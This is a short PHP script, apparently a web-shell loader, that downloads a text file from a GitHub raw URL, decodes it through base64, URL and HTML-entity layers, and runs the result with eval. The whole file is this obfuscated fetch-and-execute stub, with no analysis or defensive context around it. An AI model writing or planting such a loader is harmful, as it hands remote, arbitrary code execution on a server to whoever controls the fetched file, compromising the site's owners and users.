<?php
$xsh = file_get_contents('https://raw.githubusercontent.com/khalemboy/x/main/xsh.txt');

eval(htmlspecialchars_decode(urldecode(base64_decode($xsh))));
?>
